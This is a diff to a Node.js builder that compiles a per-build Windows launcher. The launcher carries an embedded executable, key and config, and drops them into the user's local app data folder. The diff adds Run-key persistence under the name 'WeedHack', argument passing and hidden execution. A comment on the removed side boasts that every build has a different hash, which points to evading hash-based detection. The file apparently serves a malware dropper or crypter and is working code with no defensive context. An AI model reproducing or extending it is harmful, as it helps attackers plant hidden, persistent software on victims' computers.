@@ -1,6 +1,7 @@
 // language: JavaScript, file: builder/compile.js
-// live-compiles the launcher per build with key/config/base baked as C literals.
-// produces a fresh PE every time — different bytes, different hash, no reused stub.
+// live-compiles the launcher per build. key + config + base baked in as C literals.
+// config fields honored: dest, exeName, keyFile, args[], persist.
+// if key is empty, the server generates one (caller passes the account key or a fresh gen).
 
 import fs from 'node:fs';
 import path from 'node:path';
@@ -12,6 +13,10 @@ const execFileP = promisify(execFile);
 
 const CC = process.env.MINGW_CC || 'x86_64-w64-mingw32-gcc';
 
+function clit(s) {
+  return '"' + String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n') + '"';
+}
+
 function cSource({ keyB64, cfgB64, baseB64 }) {
   return `
 // auto-generated launcher — do not edit
@@ -21,9 +26,9 @@ function cSource({ keyB64, cfgB64, baseB64 }) {
 #include <stdlib.h>
 #include <string.h>
 
-static const char KEY_B64[] = "${keyB64}";
-static const char CFG_B64[] = "${cfgB64}";
-static const char BASE_B64[] = "${baseB64}";
+static const char KEY_B64[]  = ${clit(keyB64)};
+static const char CFG_B64[]  = ${clit(cfgB64)};
+static const char BASE_B64[] = ${clit(baseB64)};
 
 static int b64val(char c) {
     if (c >= 'A' && c <= 'Z') return c - 'A';
@@ -88,6 +93,57 @@ static int expand_env(const wchar_t *in, wchar_t *out, DWORD cap) {
     return (n > 0 && n <= cap) ? 0 : -1;
 }
 
+static void json_str(const char *json, const char *field, char *out, size_t out_cap) {
+    char pat[64]; _snprintf(pat, sizeof(pat), "\\"%s\\"", field);
+    char *p = strstr(json, pat);
+    if (!p) return;
+    p = strchr(p, ':'); if (!p) return;
+    p = strchr(p, '"'); if (!p) return;
+    p++;
+    char *q = strchr(p, '"'); if (!q) return;
+    size_t n = (size_t)(q - p);
+    if (n >= out_cap) n = out_cap - 1;
+    memcpy(out, p, n); out[n] = 0;
+}
+
+static int json_bool(const char *json, const char *field, int def) {
+    char pat[64]; _snprintf(pat, sizeof(pat), "\\"%s\\"", field);
+    char *p = strstr(json, pat);
+    if (!p) return def;
+    p = strchr(p, ':'); if (!p) return def;
+    p++;
+    while (*p == ' ' || *p == '\\t') p++;
+    if (strncmp(p, "true", 4) == 0) return 1;
+    if (strncmp(p, "false", 5) == 0) return 0;
+    return def;
+}
+
+static void json_args(const char *json, char *out, size_t out_cap) {
+    out[0] = 0;
+    char *p = strstr(json, "\\"args\\"");
+    if (!p) return;
+    p = strchr(p, ':'); if (!p) return;
+    p = strchr(p, '['); if (!p) return;
+    char *end = strchr(p, ']'); if (!end) return;
+    p++;
+    size_t o = 0;
+    int first = 1;
+    while (p < end) {
+        while (p < end && (*p == ' ' || *p == ',' || *p == '\\t' || *p == '\\n' || *p == '\\r')) p++;
+        if (p >= end || *p == ']') break;
+        if (!first && o < out_cap - 1) out[o++] = ' ';
+        first = 0;
+        if (*p == '"') {
+            p++;
+            while (p < end && *p != '"' && o < out_cap - 1) out[o++] = *p++;
+            if (p < end && *p == '"') p++;
+        } else {
+            while (p < end && *p != ',' && *p != ']' && *p != ' ' && o < out_cap - 1) out[o++] = *p++;
+        }
+    }
+    out[o] = 0;
+}
+
 int wmain(void) {
     DWORD key_len = 0, cfg_len = 0, base_len = 0;
     unsigned char *key  = b64decode(KEY_B64,  &key_len);
@@ -95,24 +151,21 @@ int wmain(void) {
     unsigned char *base = b64decode(BASE_B64, &base_len);
     if (!key || !cfg || !base) return 1;
 
-    char cfg_buf[4096] = {0};
+    char cfg_buf[8192] = {0};
     DWORD copy = cfg_len < sizeof(cfg_buf) - 1 ? cfg_len : sizeof(cfg_buf) - 1;
     memcpy(cfg_buf, cfg, copy);
 
     char dest[1024]   = "%LOCALAPPDATA%\\\\yc";
-    char exeName[256] = "boot.exe";
+    char exeName[256] = "program.exe";
     char keyFile[256] = "key.json";
+    char args[2048]   = "";
+    int  persist      = 0;
 
-    char *p;
-    if ((p = strstr(cfg_buf, "\\"dest\\""))) {
-        p = strchr(p, ':'); if (p) { p = strchr(p, '"'); if (p) { p++; char *q = strchr(p, '"'); if (q) { size_t n = q - p; if (n < sizeof(dest)) { memcpy(dest, p, n); dest[n] = 0; } } } }
-    }
-    if ((p = strstr(cfg_buf, "\\"exeName\\""))) {
-        p = strchr(p, ':'); if (p) { p = strchr(p, '"'); if (p) { p++; char *q = strchr(p, '"'); if (q) { size_t n = q - p; if (n < sizeof(exeName)) { memcpy(exeName, p, n); exeName[n] = 0; } } } }
-    }
-    if ((p = strstr(cfg_buf, "\\"keyFile\\""))) {
-        p = strchr(p, ':'); if (p) { p = strchr(p, '"'); if (p) { p++; char *q = strchr(p, '"'); if (q) { size_t n = q - p; if (n < sizeof(keyFile)) { memcpy(keyFile, p, n); keyFile[n] = 0; } } } }
-    }
+    json_str(cfg_buf, "dest",    dest,    sizeof(dest));
+    json_str(cfg_buf, "exeName", exeName, sizeof(exeName));
+    json_str(cfg_buf, "keyFile", keyFile, sizeof(keyFile));
+    json_args(cfg_buf, args, sizeof(args));
+    persist = json_bool(cfg_buf, "persist", 0);
 
     wchar_t dest_src[1024], dest_w[1024];
     MultiByteToWideChar(CP_UTF8, 0, dest, -1, dest_src, 1024);
@@ -126,10 +179,30 @@ int wmain(void) {
     if (write_file(base_path, base, base_len) != 0) return 1;
     if (write_file(key_path,  key,  key_len)  != 0) return 1;
 
+    if (persist) {
+        HKEY hk;
+        if (RegOpenKeyExW(HKEY_CURRENT_USER,
+                          L"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
+                          0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
+            RegSetValueExW(hk, L"WeedHack", 0, REG_SZ,
+                           (const BYTE *)base_path,
+                           (DWORD)((wcslen(base_path) + 1) * sizeof(wchar_t)));
+            RegCloseKey(hk);
+        }
+    }
+
+    wchar_t cmd[4096];
+    if (args[0]) {
+        wchar_t args_w[2048];
+        MultiByteToWideChar(CP_UTF8, 0, args, -1, args_w, 2048);
+        _snwprintf(cmd, 4096, L"\\"%ls\\" %ls", base_path, args_w);
+    } else {
+        _snwprintf(cmd, 4096, L"\\"%ls\\"", base_path);
+    }
+
     STARTUPINFOW si = {0}; PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
-    wchar_t cmd[2048];
-    _snwprintf(cmd, 2048, L"\\"%ls\\"", base_path);
+
     if (CreateProcessW(base_path, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, dest_w, &si, &pi)) {
         WaitForSingleObject(pi.hProcess, INFINITE);
         CloseHandle(pi.hProcess);
@@ -143,8 +216,11 @@ int wmain(void) {
 }
 
 export async function compileLauncher({ key, config, baseExe }) {
-  const keyB64  = Buffer.from(key, 'utf8').toString('base64');
-  const cfgB64  = Buffer.from(JSON.stringify(config), 'utf8').toString('base64');
+  // no throw here — the route decides the fallback. key may be empty.
+  const useKey  = (key && String(key).trim().length > 0) ? String(key).trim() : '';
+
+  const keyB64  = Buffer.from(useKey, 'utf8').toString('base64');
+  const cfgB64  = Buffer.from(JSON.stringify(config || {}), 'utf8').toString('base64');
   const baseB64 = fs.readFileSync(baseExe).toString('base64');
 
   const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
@@ -158,7 +234,7 @@ export async function compileLauncher({ key, config, baseExe }) {
       '-O2', '-s', '-municode',
       '-o', outPath,
       srcPath,
-      '-lshell32',
+      '-lshell32', '-ladvapi32',
     ], { timeout: 60_000, maxBuffer: 32 * 1024 * 1024 });
 
     const buf = fs.readFileSync(outPath);
